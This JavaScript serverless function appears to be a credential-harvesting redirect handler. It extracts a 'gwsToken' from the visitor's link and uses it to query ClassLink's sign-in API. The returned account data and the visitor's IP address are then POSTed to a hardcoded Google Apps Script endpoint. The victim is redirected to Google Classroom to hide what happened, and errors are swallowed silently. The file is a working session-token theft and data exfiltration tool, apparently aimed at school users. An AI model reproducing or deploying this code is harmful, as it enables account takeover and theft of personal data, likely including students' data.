export async function onRequest(context) {
    const { request } = context;
    
    performAsyncOperations(request);

    return Response.redirect("https://classroom.google.com", 302);
}

async function performAsyncOperations(request) {
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const idString = decodeURI(idMatch ? idMatch[1] : null);
    const ip = request.headers.get("CF-Connecting-IP");
    
    let id;
    try {
        id = idString.match(/gwsToken":\s*"(.+?)"/)[1];
    } catch (error) {}
    try {
        const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
            method: "GET",
            headers: {
                "gwsToken": id
            }
        });

        if (nodeApiResponse.ok) {
            const nodeApiData = await nodeApiResponse.json();

            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: nodeApiData, ip: ip })
            });
        }
    } catch (error) {}
}
